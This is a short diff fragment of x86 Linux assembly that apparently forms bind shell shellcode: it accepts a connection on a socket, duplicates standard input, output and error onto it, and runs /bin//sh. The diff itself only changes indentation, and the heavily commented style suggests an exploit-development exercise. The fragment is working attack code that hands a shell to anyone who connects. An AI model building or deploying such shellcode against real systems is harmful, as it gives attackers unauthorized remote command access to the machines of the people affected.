@@ -299,11 +299,11 @@ _start:
 	mov ax, 0x16c          ; Syscall for accept4() = 364 or 0x16c, loading it in AX
 	; 1st argument for accept() - sockfd - still in EBX
 	; 2nd argument for accept() - 0 - still in ECX
-    cdq                    ; Clearing EDX for 3rd argument - 0
-    xor esi, esi           ; Clearing ESI for 4th argument - 0
-    int 0x80               ; Execute accept4 syscall
+	cdq                    ; Clearing EDX for 3rd argument - 0
+	xor esi, esi           ; Clearing ESI for 4th argument - 0
+	int 0x80               ; Execute accept4 syscall
     
-    ; Storing the return value connection socket fd in EAX to EBX for later usage
+	; Storing the return value connection socket fd in EAX to EBX for later usage
 	mov ebx, eax
     ; Initializing a counter variable = 3 for loop
 	mov cl, 0x3    
@@ -316,8 +316,8 @@ _start:
 	jnz short loop_dup2    ; Jump back to loop_dup2 label until ZF is set
 
 	; execve() Syscall
-    push edx               ; push for NULL termination - EDX already set to 0
-    push dword 0x68732f2f  ; push //sh
+	push edx               ; push for NULL termination - EDX already set to 0
+	push dword 0x68732f2f  ; push //sh
 	push dword 0x6e69622f  ; push /bin
 	mov ebx, esp           ; store address of TOS - /bin//sh
 	mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
